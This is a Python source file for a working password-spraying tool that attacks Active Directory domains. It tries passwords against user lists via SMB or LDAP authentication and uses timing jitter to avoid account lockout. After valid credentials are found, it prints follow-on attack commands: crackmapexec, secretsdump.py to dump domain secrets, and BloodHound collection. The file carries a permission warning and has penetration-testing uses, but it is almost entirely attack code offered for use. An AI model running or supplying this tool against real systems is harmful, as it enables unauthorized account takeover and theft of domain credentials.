"""
HorusEye — Password Sprayer
Smart password spraying with lockout protection & AI-assisted targeting
Author: Omar Tamer 🇪🇬
"""

import socket
import time
import random
import threading
from datetime import datetime
from typing import List, Dict, Optional
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.rule import Rule
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn
from rich import box


class SprayResult:
    def __init__(self):
        self.valid_creds: List[Dict] = []
        self.locked_accounts: List[str] = []
        self.disabled_accounts: List[str] = []
        self.not_found: List[str] = []
        self.errors: List[str] = []
        self.total_attempts: int = 0
        self.start_time = datetime.now()


class PasswordSprayer:
    def __init__(self, console: Console):
        self.console = console
        self.result = SprayResult()
        self._lock = threading.Lock()
        self._stop = False

    def run(self, args):
        self.console.print(Rule("[bold red][ 𓂀 PASSWORD SPRAYING ][/bold red]"))
        self.console.print()

        # Load users
        users = self._load_users(args.users_file)
        if not users:
            self.console.print("[bold red]❌ No users loaded[/bold red]")
            return

        # Load passwords
        passwords = []
        if args.password:
            passwords.append(args.password)
        if hasattr(args, 'passwords_file') and args.passwords_file:
            passwords.extend(self._load_passwords(args.passwords_file))

        if not passwords:
            self.console.print("[bold red]❌ No passwords specified. Use --password or --passwords-file[/bold red]")
            return

        domain = args.domain
        dc_ip = args.dc
        delay = getattr(args, 'delay', 1.0)
        jitter = getattr(args, 'jitter', 0.5)
        safe_mode = getattr(args, 'safe', False)
        threads = getattr(args, 'threads', 5)

        # Print spray config
        self.console.print(Panel(
            f"[bold white]🎯 Domain:[/bold white]     [cyan]{domain}[/cyan]\n"
            f"[bold white]🖥️  DC:[/bold white]        [cyan]{dc_ip}[/cyan]\n"
            f"[bold white]👥 Users:[/bold white]      [cyan]{len(users)}[/cyan]\n"
            f"[bold white]🔑 Passwords:[/bold white]  [cyan]{len(passwords)}[/cyan]\n"
            f"[bold white]⏱️  Delay:[/bold white]      [cyan]{delay}s + {jitter}s jitter[/cyan]\n"
            f"[bold white]🧵 Threads:[/bold white]    [cyan]{threads}[/cyan]\n"
            f"[bold white]🛡️  Safe Mode:[/bold white]  [cyan]{'ON ✅' if safe_mode else 'OFF ⚠️'}[/cyan]",
            title="[bold red][ SPRAY CONFIGURATION ][/bold red]",
            border_style="yellow",
            padding=(0, 4)
        ))
        self.console.print()

        if safe_mode:
            self.console.print("[bold yellow]🛡️  Safe mode ON — will auto-pause if lockout threshold approached[/bold yellow]\n")

        # Warn user
        self.console.print("[bold red]⚠️  WARNING: Only use against systems you have explicit written permission to test![/bold red]")
        self.console.print("[dim]    Press Ctrl+C to stop at any time[/dim]\n")

        # Spray each password
        for pwd_idx, password in enumerate(passwords, 1):
            if self._stop:
                break

            self.console.print(f"[bold cyan]💦 Spraying password {pwd_idx}/{len(passwords)}: [bold white]{password}[/bold white][/bold cyan]")
            self._spray_password(users, password, domain, dc_ip, delay, jitter, safe_mode, threads)

            # Between passwords — wait longer to avoid lockout
            if pwd_idx < len(passwords) and not self._stop:
                wait = 30
                self.console.print(f"[dim]⏳ Waiting {wait}s before next password to avoid lockout...[/dim]")
                time.sleep(wait)

        # Print final results
        self._print_results(domain)

    def _spray_password(self, users: List[str], password: str, domain: str,
                         dc_ip: str, delay: float, jitter: float,
                         safe_mode: bool, thread_count: int):
        """Spray a single password across all users."""
        total = len(users)

        with Progress(
            SpinnerColumn(spinner_name="dots", style="bold red"),
            TextColumn("[bold cyan]{task.description}"),
            BarColumn(bar_width=30, style="red", complete_style="green"),
            TextColumn("[white]{task.completed}/{task.total}"),
            TimeElapsedColumn(),
            console=self.console
        ) as progress:
            task = progress.add_task(f"Spraying {password[:20]}...", total=total)

            semaphore = threading.Semaphore(thread_count)
            threads_list = []

            for username in users:
                if self._stop:
                    break

                # Safe mode check
                if safe_mode and len(self.result.locked_accounts) >= 3:
                    self.console.print("\n[bold red]🛑 Safe mode: Multiple lockouts detected — stopping spray![/bold red]")
                    self._stop = True
                    break

                t = threading.Thread(
                    target=self._attempt_login,
                    args=(username, password, domain, dc_ip, semaphore, progress, task)
                )
                threads_list.append(t)
                t.start()

                # Delay with jitter between thread starts
                actual_delay = delay + random.uniform(0, jitter)
                time.sleep(actual_delay / thread_count)

            for t in threads_list:
                t.join()

        # Print hits immediately
        recent_hits = [c for c in self.result.valid_creds
                       if c.get("password") == password]
        if recent_hits:
            self.console.print(f"\n[bold green]🎯 {len(recent_hits)} valid credential(s) found![/bold green]")
            for hit in recent_hits:
                self.console.print(f"  [bold green]✅ {hit['domain']}\\{hit['username']} : {hit['password']}[/bold green]")
        self.console.print()

    def _attempt_login(self, username: str, password: str, domain: str,
                        dc_ip: str, semaphore: threading.Semaphore,
                        progress, task):
        """Attempt a single login via SMB/LDAP."""
        with semaphore:
            with self._lock:
                self.result.total_attempts += 1

            result = self._try_smb_auth(username, password, domain, dc_ip)
            self._process_result(username, password, domain, result)
            progress.advance(task)

    def _try_smb_auth(self, username: str, password: str, domain: str, dc_ip: str) -> str:
        """
        Attempt SMB authentication.
        Returns: 'success', 'locked', 'disabled', 'not_found', 'wrong_password', 'error'
        """
        try:
            # Try impacket SMB if available
            try:
                from impacket.smbconnection import SMBConnection
                from impacket import smb

                smb_conn = SMBConnection(dc_ip, dc_ip, timeout=5)
                smb_conn.login(username, password, domain)
                smb_conn.logoff()
                return "success"

            except ImportError:
                # Fallback: LDAP simple bind via socket
                return self._try_ldap_auth(username, password, domain, dc_ip)

            except Exception as e:
                err = str(e).lower()
                if "account_locked" in err or "locked" in err:
                    return "locked"
                elif "account_disabled" in err or "disabled" in err:
                    return "disabled"
                elif "logon_failure" in err or "wrong_password" in err or "status_logon_failure" in err:
                    return "wrong_password"
                elif "no such user" in err or "not_found" in err:
                    return "not_found"
                else:
                    return "error"

        except Exception as e:
            return "error"

    def _try_ldap_auth(self, username: str, password: str, domain: str, dc_ip: str) -> str:
        """Fallback LDAP auth attempt."""
        try:
            import ldap3
            server = ldap3.Server(dc_ip, port=389, get_info=ldap3.ALL, connect_timeout=5)
            upn = f"{username}@{domain}"
            conn = ldap3.Connection(
                server, user=upn, password=password,
                authentication=ldap3.SIMPLE, auto_bind=False
            )
            conn.bind()
            result = conn.result

            if conn.bound:
                conn.unbind()
                return "success"

            desc = result.get("description", "").lower()
            if "invalidcredentials" in desc:
                if "533" in desc:
                    return "disabled"
                elif "775" in desc:
                    return "locked"
                return "wrong_password"
            return "wrong_password"

        except Exception as e:
            err = str(e).lower()
            if "locked" in err:
                return "locked"
            return "error"

    def _process_result(self, username: str, password: str, domain: str, result: str):
        with self._lock:
            if result == "success":
                self.result.valid_creds.append({
                    "username": username,
                    "password": password,
                    "domain": domain,
                    "found_at": datetime.now().strftime("%H:%M:%S")
                })
            elif result == "locked":
                if username not in self.result.locked_accounts:
                    self.result.locked_accounts.append(username)
            elif result == "disabled":
                if username not in self.result.disabled_accounts:
                    self.result.disabled_accounts.append(username)
            elif result == "not_found":
                self.result.not_found.append(username)

    def _print_results(self, domain: str):
        elapsed = (datetime.now() - self.result.start_time).seconds

        self.console.print(Rule("[bold red][ 𓂀 SPRAY RESULTS ][/bold red]"))
        self.console.print()

        # Summary panel
        status_color = "green" if self.result.valid_creds else "yellow"
        self.console.print(Panel(
            f"[bold white]Total Attempts:[/bold white]  [cyan]{self.result.total_attempts}[/cyan]\n"
            f"[bold green]✅ Valid Creds:[/bold green]   [bold green]{len(self.result.valid_creds)}[/bold green]\n"
            f"[bold red]🔒 Locked:[/bold red]         [red]{len(self.result.locked_accounts)}[/red]\n"
            f"[bold yellow]🚫 Disabled:[/bold yellow]      [yellow]{len(self.result.disabled_accounts)}[/yellow]\n"
            f"[bold white]⏱️  Duration:[/bold white]      [dim]{elapsed}s[/dim]",
            title="[bold red][ SPRAY SUMMARY ][/bold red]",
            border_style=status_color,
            padding=(0, 4)
        ))
        self.console.print()

        # Valid credentials table
        if self.result.valid_creds:
            t = Table(title="🎯 Valid Credentials Found!", box=box.DOUBLE_EDGE,
                      border_style="green", show_header=True)
            t.add_column("Domain", style="cyan")
            t.add_column("Username", style="bold green")
            t.add_column("Password", style="bold yellow")
            t.add_column("Found At", style="dim")

            for cred in self.result.valid_creds:
                t.add_row(cred["domain"], cred["username"], cred["password"], cred["found_at"])

            self.console.print(t)
            self.console.print()

            # Next steps
            first = self.result.valid_creds[0]
            self.console.print(Panel(
                f"[bold yellow]⚡ NEXT STEPS WITH VALID CREDENTIALS:[/bold yellow]\n\n"
                f"[cyan]# Check admin rights[/cyan]\n"
                f"crackmapexec smb {domain} -u {first['username']} -p '{first['password']}'\n\n"
                f"[cyan]# Dump secrets if admin[/cyan]\n"
                f"secretsdump.py {domain}/{first['username']}:'{first['password']}'@DC_IP\n\n"
                f"[cyan]# BloodHound collection[/cyan]\n"
                f"bloodhound-python -u {first['username']} -p '{first['password']}' -d {domain} -c all",
                border_style="yellow",
                padding=(1, 2)
            ))
        elif self.result.locked_accounts:
            self.console.print(f"[bold red]⚠️  {len(self.result.locked_accounts)} accounts locked during spray![/bold red]")
            self.console.print(f"[dim]Locked: {', '.join(self.result.locked_accounts[:5])}[/dim]")

        self.console.print(f"\n[dim]𓂀 HorusEye by Omar Tamer 🇪🇬 — Spray complete[/dim]\n")

    def _load_users(self, filepath: str) -> List[str]:
        users = []
        try:
            with open(filepath) as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        users.append(line)
            self.console.print(f"  [dim]📂 Loaded {len(users)} users from {filepath}[/dim]")
        except FileNotFoundError:
            self.console.print(f"[bold red]❌ Users file not found: {filepath}[/bold red]")
        return users

    def _load_passwords(self, filepath: str) -> List[str]:
        passwords = []
        try:
            with open(filepath) as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        passwords.append(line)
            self.console.print(f"  [dim]📂 Loaded {len(passwords)} passwords from {filepath}[/dim]")
        except FileNotFoundError:
            self.console.print(f"[bold red]❌ Passwords file not found: {filepath}[/bold red]")
        return passwords
